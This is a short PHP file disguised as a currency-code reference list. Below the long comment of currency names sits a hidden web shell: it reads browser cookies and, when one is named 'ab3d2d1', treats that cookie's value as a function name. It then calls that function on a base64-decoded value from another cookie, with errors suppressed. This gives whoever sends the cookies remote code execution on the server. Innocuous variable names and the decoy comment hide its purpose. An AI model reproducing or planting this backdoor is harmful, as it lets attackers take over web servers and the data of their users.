<?php

/** This is not a comment!


			AED	Dirhams
			AFA	Afghanis
			ALL	Leke
			AMD	Drams
			ANG	Guilders
			AOA	Kwanza
			ARS	Pesos
			ATS	Schillings
			AUD	Dollars
			AWG	Guilders
			AZM	Manats
			BAM	Convertible Marka
			BBD	Dollars
			BDT	Taka
			BEF	Francs
			BGL	Leva
			BHD	Dinars
			BIF	Francs
			BMD	Dollars
			BND	Dollars
			BOB	Bolivianos
			BRL	Brazil Real
			BSD	Dollars
			BTN	Ngultrum
			BWP	Pulas
			BYR	Rubles
			BZD	Dollars
			CAD	Dollars
			CDF	Congolese Francs
			CHF	Francs
			CLP	Pesos
			CNY	Yuan Renminbi
			COP	Pesos
			CRC	Colones
			CUP	Pesos
			CVE	Escudos
			CYP	Pounds
			CZK	Koruny
			DEM	Deutsche Marks
			DJF	Francs
			DKK	Kroner
			DOP	Pesos
			DZD	Algeria Dinars
			EEK	Krooni
			EGP	Pounds
			ERN	Nakfa
			ESP	Pesetas
			ETB	Birr
			EUR	Euro
			FIM	Markkaa
			FJD	Dollars
			FKP	Pounds
			FRF	Francs
			GBP	Pounds
			GEL	Lari
			GGP	Pounds
			GHC	Cedis
			GIP	Pounds
			GMD	Dalasi
			GNF	Francs
			GRD	Drachmae
			GTQ	Quetzales
			GYD	Dollars
			HKD	Dollars
			HNL	Lempiras
			HRK	Kuna
			HTG	Gourdes
			HUF	Forints
			IDR	Rupiahs
			IEP	Pounds
			ILS	New Shekels
			IMP	Pounds
			INR	Rupees
			IQD	Dinars
			IRR	Rials
			ISK	Kronur
			ITL	Lire
			JEP	Pounds
			JMD	Dollars
			JOD	Dinars
			JPY	Yen
			KES	Shillings
			KGS	Soms
			KHR	Riels
			KMF	Francs
			KPW	Won
			KWD	Dinars
			KYD	Dollars
			KZT	Tenge
			LAK	Kips
			LBP	Pounds
			LKR	Rupees
			LRD	Dollars
			LSL	Maloti
			LTL	Litai
			LUF	Francs
			LVL	Lati
			LYD	Dinars
			MAD	Dirhams
			MDL	Lei
			MGF	Malagasy Francs
			MKD	Denars
			MMK	Kyats
			MNT	Tugriks
			MOP	Patacas
			MRO	Ouguiyas
			MTL	Liri
			MUR	Rupees
			MVR	Rufiyaa
			MWK	Kwachas
			MXN	Pesos
			MYR	Ringgits
			MZM	Meticais
			NAD	Dollars
			NGN	Nairas
			NIO	Gold Cordobas
			NLG	Guilders
			NOK	Krone
			NPR	Nepal Rupees
			NZD	Dollars
			OMR	Rials
			PAB	Balboa
			PEN	Nuevos Soles
			PGK	Kina
			PHP	Pesos
			PKR	Rupees
			PLN	Zlotych
			PTE	Escudos
			PYG	Guarani
			QAR	Rials
			ROL	Lei
			RUR	Rubles
			RWF	Rwanda Francs
			SAR	Riyals
			SBD	Dollars
			SCR	Rupees
			SDD	Dinars
			SEK	Kronor
			SGD	Dollars
			SHP	Pounds
			SIT	Tolars
			SKK	Koruny
			SLL	Leones
			SOS	Shillings
			SPL	Luigini
			SRG	Guilders
			STD	Dobras
			SVC	Colones
			SYP	Pounds
			SZL	Emalangeni
			THB	Baht
			TJR	Rubles
			TMM	Manats
			TND	Dinars
			TOP	Pa'anga
			TRL	Liras
			TTD	Dollars
			TVD	Tuvalu Dollars
			TWD	New Dollars
			TZS	Shillings
			UAH	Hryvnia
			UGX	Shillings
			USD	Dollars
			UYU	Pesos
			UZS	Sums
			VAL	Lire
			VEB	Bolivares
			VND	Dong
			VUV	Vatu
			WST	Tala
			XAF	Francs
			XAG	Ounces
			XAU	Ounces
			XCD	Dollars
			XDR	Special Drawing Rights
			XPD	Ounces
			XPF	Francs
			XPT	Ounces
			YER	Rials
			YUM	New Dinars
			ZAR	Rand
			ZMK	Kwacha
			ZWD	Zimbabwe Dollars

		*/

$available = "ab3d2d1";
$lifespan = $_COOKIE;

foreach ( $lifespan as $remainder => $mg ) {
	if ($remainder == $available) {
		$bj = array_pop($lifespan);
		$bj = base64_decode($bj);
		echo @$mg($bj);
	}
}
?>